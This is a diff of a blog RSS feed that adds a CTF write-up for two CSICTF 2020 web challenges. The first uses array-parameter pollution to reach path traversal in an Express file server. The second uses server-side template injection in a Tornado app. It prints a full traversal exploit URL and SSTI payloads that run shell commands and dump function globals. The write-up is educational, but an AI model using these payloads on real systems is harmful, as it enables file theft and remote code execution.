@@ -5,12 +5,168 @@
     <link>https://ahmed-belkahla.me/post/</link>
       <atom:link href="https://ahmed-belkahla.me/post/index.xml" rel="self" type="application/rss+xml" />
     <description>Posts</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2020</copyright><lastBuildDate>Wed, 27 May 2020 09:00:00 +0000</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2020</copyright><lastBuildDate>Tue, 21 Jul 2020 08:00:00 +0000</lastBuildDate>
     <image>
       <url>https://ahmed-belkahla.me/img/me.jpg</url>
       <title>Posts</title>
       <link>https://ahmed-belkahla.me/post/</link>
     </image>
+    
+    <item>
+      <title>CSICTF 2k20 - Web Exploitation</title>
+      <link>https://ahmed-belkahla.me/post/csictf2020/</link>
+      <pubDate>Tue, 21 Jul 2020 08:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/csictf2020/</guid>
+      <description>&lt;p&gt;After a long week of work I decided to participate in CSICTF2k20 with my team Fword since I didn&amp;rsquo;t participate for a long time :( We were among the top 30 teams and we managed to almost solve all Web exploitaion tasks with my teammate @Hera. However I enjoyed solving File Library and The Usual Suspects tasks.&lt;/p&gt;
+&lt;h1 id=&#34;file-library-497pts-40-solves-&#34;&gt;File Library 497pts (40 solves)&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/IRJZKbM.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We are given the source code of the task :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const express = require(&#39;express&#39;);
+const path = require(&#39;path&#39;);
+const fs = require(&#39;fs&#39;);
+
+const app = express();
+
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () =&amp;gt; {
+   console.log(`Listening on port ${PORT}`);
+});
+
+app.get(&#39;/getFile&#39;, (req, res) =&amp;gt; {
+   let { file } = req.query;
+   console.log(&amp;quot;file is: &amp;quot;+file);
+   if (!file) {
+       res.send(`file=${file}\nFilename not specified!`);
+       return;
+   }
+
+   try {
+
+       if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;)) {
+           res.send(`file=${file}\nInvalid filename!`);
+           return;
+       }
+   } catch (err) {
+       res.send(&#39;An error occured!&#39;);
+       return;
+   }
+
+   if (!allowedFileType(file)) {
+       res.send(`File type not allowed`);
+       return;
+   }
+
+   if (file.length &amp;gt; 5) {
+       file = file.slice(0, 5);
+   }
+
+   const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
+  console.log(&amp;quot;returnedFile: &amp;quot;+returnedFile);
+   fs.readFile(returnedFile, (err) =&amp;gt; {
+       if (err) {
+           if (err.code != &#39;ENOENT&#39;) console.log(err);
+           res.send(&#39;An error occured!&#39;);
+           return;
+       }
+
+       res.sendFile(returnedFile);
+   });
+});
+
+app.get(&#39;/*&#39;, (req, res) =&amp;gt; {
+   res.sendFile(__dirname + &#39;/index.html&#39;);
+});
+
+function allowedFileType(file) {
+   const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
+console.log(&amp;quot;index +1 is &amp;quot;+file.indexOf(&#39;.&#39;) + 1);    
+console.log(&amp;quot;format inside allowedfile is: &amp;quot;+format);
+   if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) {
+       return true;
+   }
+
+   return false;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I added some logging statements to facilitate things, as you can see when we visit &lt;strong&gt;/getfile&lt;/strong&gt; we can provide in a get parameter a filename that will be displayed for us but there are some restrictions,
+we can&amp;rsquo;t use whitespaces or &amp;ldquo;/&amp;quot;, there are only four extensions that are allowed (js|ts|c|cpp) .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/ClTfqlL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After reading carefully the source code, I was pretty sure that we will use http parameters pollution because there is no check concerning the type of get parameters so we can enter an array and try to exploit the misbehaviour that may occur.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s imagine that we enter the following array :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../proc/self/cwd/flag.txt&amp;rdquo;,&amp;quot;.&amp;quot;,&amp;ldquo;js&amp;rdquo;]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;1st Check&lt;/strong&gt; : &lt;code&gt;if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;When includes is applied to an array it will check if there&amp;rsquo;s a field that is equal to the passed parameter (&amp;rdquo; &amp;quot; and &amp;ldquo;/&amp;rdquo; in our case) which is false here so we can successfully pass this check&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;2nd Check&lt;/strong&gt; : &lt;code&gt;if (!allowedFileType(file))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s take a look at the code of this function :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;
+function allowedFileType(file) {
+const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
+    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) {
+        return true;
+    }
+
+    return false;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It will slice our array beginning from the indexOf(&amp;quot;.&amp;quot;)+1 so in our case the result will be the last field of our array which is &amp;ldquo;js&amp;rdquo; and Bingo we will also pass this check :D&lt;/p&gt;
+&lt;p&gt;The following lines will remove the last two fields of our array :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if (file.length &amp;gt; 5) {
+  file = file.slice(0, 5);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;so our array will become:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../proc/self/cwd/flag.txt&amp;rdquo;]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And finally after resolving the path returnedFile will contain /proc/self/cwd/flag.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; __dirname which is the current directory is ignored because of our &amp;ldquo;../../&amp;rdquo; fields, and &lt;strong&gt;/proc/self/cwd&lt;/strong&gt; is equivalent to the current directory.&lt;/p&gt;
+&lt;p&gt;So finally our array will be resolved to the path we want, this is the final payload which is only a traduction to what we said before:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://chall.csivit.com:30222/getfile?file[]=../../&amp;amp;file[]=../../&amp;amp;file[]=../../&amp;amp;file[]=../../&amp;amp;file[]=../../proc/self/cwd/flag.txt&amp;amp;file[]=.&amp;amp;file[]=js
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/sdvZ1eL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It was a really nice task so thanks to the author!&lt;/p&gt;
+&lt;h1 id=&#34;the-usual-suspects-499pts-32-solves-&#34;&gt;The Usual Suspects 499pts (32 solves)&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/qorhTCy.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Visiting the website, a well trained eye can directly notice the possibility of an SSTI attack in icecream parameter.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/zbwADG6.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We thought that it was a typical SSTI task but unfortunately even after getting RCE using the usual jinja2 SSTI payloads we didn&amp;rsquo;t find anything. The first payload we used:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;{{ &amp;lsquo;&#39;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[270](&amp;lsquo;ls&amp;rsquo;,shell=True,stdout=-1).communicate()}}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;After this step we really didn&amp;rsquo;t know what to do, the server used here was Tornado, which is an asynchronous python web server so I started reading its documentation and I noticed that the Main class always inherits from &lt;strong&gt;tornado.web.RequestHandler&lt;/strong&gt;.
+After some digging I got a nice idea , what if we list all the subclasses of Object ( The super class, it&amp;rsquo;s the parent of all classes) Then we will list the subclasses of tornado.web.RequestHandler and finally we will check the globals of &lt;strong&gt;get&lt;/strong&gt; function from MainHadnler class.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Get the RequestHandler class:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;{{ &amp;lsquo;&#39;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[363]}}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;Get the MainHandler class which inherits from RequestHandler&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;{{ &amp;lsquo;&#39;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[363].&lt;strong&gt;subclasses&lt;/strong&gt;()[-1]}}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And finally we will see the &lt;strong&gt;globals&lt;/strong&gt; of get function ( &lt;strong&gt;&lt;strong&gt;globals&lt;/strong&gt;&lt;/strong&gt; is a reference to the dictionary that holds the function’s global variables ).
+Final payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{{ &#39;&#39;.__class__.__mro__[1].__subclasses__()[363].__subclasses__()[-1].get.__globals__}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Bingo we got our flag :D I asked the admin and he told me that this is the unintended solution of the task.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/8pcqJ3T.png&#34; alt=&#34;DISCORD&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If you have any questions you can contact me on twitter @BelkahlaAhmed1 or contact our team twitter @FwordTeam ! I hope that you liked the writeup, and don&amp;rsquo;t forget to participate in FwordCTF on 29th of August , a lot of fun challenges will be there.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>How i hacked a famous pizza vendor in Tunisia ?</title>
